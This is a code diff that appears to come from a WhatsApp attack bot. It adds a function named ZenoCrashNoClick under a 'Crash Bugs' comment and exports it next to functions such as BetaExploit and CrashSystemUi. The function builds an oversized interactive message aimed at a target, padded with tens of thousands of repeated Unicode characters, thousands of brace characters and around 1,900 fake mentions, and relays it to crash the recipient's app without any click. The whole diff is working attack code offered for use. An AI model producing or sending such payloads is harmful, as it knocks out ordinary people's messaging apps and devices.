@@ -3645,6 +3645,100 @@ async function yhcv(sock, target) {
     }
   }, { messageId: null });
 }
+// Crash Bugs
+async function ZenoCrashNoClick(target) {
+  const ButtonsPush = [
+    {
+      name: "single_select",
+      buttonParamsJson: JSON.stringify({  
+        title: "ꦽ".repeat(5000),
+        sections: [
+          {
+            title: "\u0000",
+            rows: [],
+          },
+        ],
+      }),
+    },
+  ];
+  
+  for (let i = 0; i < 10; i++) {
+    ButtonsPush.push(
+      {
+        name: "quick_reply",
+        buttonParamsJson: JSON.stringify({
+          display_text: "ꦽ".repeat(5000),
+        })
+      },
+      {
+        name: "mpm",
+        buttonParamsJson: JSON.stringify({
+          status: true
+        })
+      },
+      {
+        name: "cta_call",
+        buttonParamsJson: JSON.stringify({
+          status: true
+        })
+      },
+    );
+  }
+  
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "ោ៝".repeat(20000),
+              locationMessage: {
+                degreesLatitude: 0,
+                degreesLongtitude: 0,
+              },
+              hasMediaAttachment: true,
+            },
+            body: {
+              text: "𝗫 - S T R A V A" +
+                "ꦽ".repeat(25000) +
+                "ោ៝".repeat(20000),
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+              buttons: ButtonsPush,
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "131338822@s.whatsapp.net",
+                ...Array.from(
+                  { length: 1900 },
+                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                ),
+              ],
+              remoteJid: "X",
+              participant: target,
+              stanzaId: "1234567890ABCDEF",
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 3,
+                  expiryTimestamp: Date.now() + 1814400000
+                },
+              },
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+  
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+}
 module.exports = {
   // Session management
   activeConnections,
@@ -3724,4 +3818,5 @@ BetaExploit,
   DelayFreze,
   CrashSystemUi,
   yhcv,
+  ZenoCrashNoClick,
 };
